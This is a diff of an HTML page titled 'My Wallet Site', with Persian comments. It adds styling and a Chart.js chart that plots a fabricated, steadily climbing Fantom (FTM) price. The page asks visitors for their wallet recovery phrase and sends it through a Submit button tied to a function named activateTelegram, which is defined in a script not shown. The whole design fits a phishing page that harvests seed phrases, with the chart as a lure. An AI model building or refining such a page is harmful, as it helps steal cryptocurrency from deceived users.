@@ -1,15 +1,43 @@
 <!DOCTYPE html>
 <html lang="en">
-    <!-- بارگذاری فایل جاوااسکریپت -->
-    <script src="/js/chart.js"></script>
-</body>
-</html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>My Wallet Site</title>
     <!-- لینک به فایل CSS -->
     <link rel="stylesheet" href="styles/style.css">
+    <!-- فونت‌های گوگل -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        /* استایل داخلی */
+        body {
+            font-family: 'Inter', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f5f5f5;
+            text-align: center;
+        }
+        h1 {
+            color: #333;
+        }
+        input {
+            padding: 10px;
+            font-size: 14px;
+            margin: 10px 0;
+            width: 60%;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 14px;
+            color: white;
+            background-color: #007BFF;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
 </head>
 <body>
     <!-- محتوای صفحه -->
@@ -17,20 +45,37 @@
     <p>Enter your recovery phrase below:</p>
     <input type="text" id="recovery-phrase" placeholder="Enter recovery phrase">
     <button onclick="activateTelegram()">Submit</button>
-    
+
+    <!-- نمودار -->
+    <canvas id="ftmChart"></canvas>
+
     <!-- بارگذاری فایل جاوا اسکریپت -->
     <script src="/js/script.js"></script>
-</body>
-</html>
+    <script>
+        // اسکریپت نمایش نمودار
+        const ctx = document.getElementById('ftmChart').getContext('2d');
+        const prices = Array.from({ length: 30 }, (_, i) => 0.001 * Math.pow(1.2, i)); // رشد قیمت فانتوم
+        const labels = Array.from({ length: 30 }, (_, i) => `Day ${i + 1}`);
 
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Combined Wallet Site</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
-    <style>
+        new Chart(ctx, {
+            type: 'line',
+            data: {
+                labels: labels,
+                datasets: [{
+                    label: 'FTM Price (USD)',
+                    data: prices,
+                    borderColor: 'rgba(75, 192, 192, 1)',
+                    backgroundColor: 'rgba(75, 192, 192, 0.2)',
+                    borderWidth: 2,
+                    tension: 0.4
+                }]
+            },
+            options: {
+                responsive: true,
+                maintainAspectRatio: false
+            }
+        });
+    </script>
 </body>
 </html>
 
